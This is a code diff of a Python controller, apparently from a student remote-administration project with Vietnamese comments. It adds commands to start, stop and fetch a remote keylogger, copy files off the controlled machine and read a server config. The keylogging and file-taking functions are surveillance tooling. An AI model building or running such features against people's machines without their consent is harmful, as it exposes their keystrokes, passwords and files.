@@ -1,7 +1,9 @@
+import json
 import os
 import socket
 import threading
-from tkinter import filedialog, messagebox
+import time
+from tkinter import messagebox
 import keyboard
 from vidstream import StreamingServer
 
@@ -176,42 +178,38 @@ class cl_controller:
 
         # Khi dừng chia sẻ màn hình
         server.stop_server()
-        self.view.show_message("Đã dừng chia sẻ màn hình.")     
+        self.view.show_message("Đã dừng chia sẻ màn hình.")       
 
     #----------5. KEYLOGGER -------------------------------
     def start_keylogger(self, client_socket):
         if not self.is_logging:
-            self.is_logging = True
-            self.model.send_command("START_KEYLOGGER")
-            # self.view.show_message("Keylogger started!")
+            self.is_logging = True            
+            self.model.send_command(client_socket, "START_KEYLOGGER")  
 
-    def stop_keylogger(self):
+    def stop_keylogger(self, client_socket):
         if self.is_logging:
-            self.is_logging = False
-            keys = self.model.send_command("STOP_KEYLOGGER")
-            self.model.add_to_keys_buffer(keys)  # Lưu các phím vào bộ nhớ tạm
-            # self.view.update_entry(" ".join(keys))
-            # self.view.show_message("Keylogger stopped and keys fetched.")
+            self.is_logging = False        
+            self.model.send_command(client_socket, "STOP_KEYLOGGER")            
+            response = self.model.receive_response_utf8(client_socket)       
+            return response
 
-    def print_keylogger(self):
-        keys = self.model.send_command("FETCH_KEYLOGGER")
-        self.model.add_to_keys_buffer(keys)  # Thêm phím vào bộ nhớ tạm
-        existing_text = self.view.get_entry_text()
-        self.view.update_entry(existing_text + " " + " ".join(keys))
-        # self.view.show_message("Keys appended to the entry.")
-
-    def clear_entry(self):
-        self.view.update_entry("")
-        self.model.clear_keys_buffer()
-        # self.view.show_message("Entry cleared.")
+    def print_keylogger(self, client_socket):
+        response = ""
+        self.model.send_command(client_socket, "FETCH_KEYLOGGER")  
+        time.sleep(1)
+        response = self.model.receive_response_utf8(client_socket) 
+        return response
         
     #----------6. DEL & COPY FILE --------------------------
     def get_files_from_server(self, client_socket, file_path, destination_path): 
+        
         # Tạo tên file dựa trên đường dẫn từ server
         filename = os.path.basename(file_path)
-        destination_path = os.path.join(destination_path, filename)            
+        destination_path = os.path.join(destination_path, filename)
+                    
         # Gửi yêu cầu copy file đến server với đường dẫn file đầy đủ
         self.model.send_command(client_socket, f"COPY_FILE {file_path}")
+        
         # Nhận kích thước file
         file_size = int.from_bytes(client_socket.recv(4), byteorder='big')   
         
@@ -247,3 +245,15 @@ class cl_controller:
             return True
         else:
             return False
+        
+    def read_config_server(self, CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, "r") as file:
+                config = json.load(file)
+            return config.get("server_ip"), config.get("server_port")
+        except json.JSONDecodeError:
+            print("File cấu hình không hợp lệ. Vui lòng kiểm tra nội dung file.")
+            return None, None
+        except FileNotFoundError:
+            print("File cấu hình không tồn tại.")
+            return None, None 
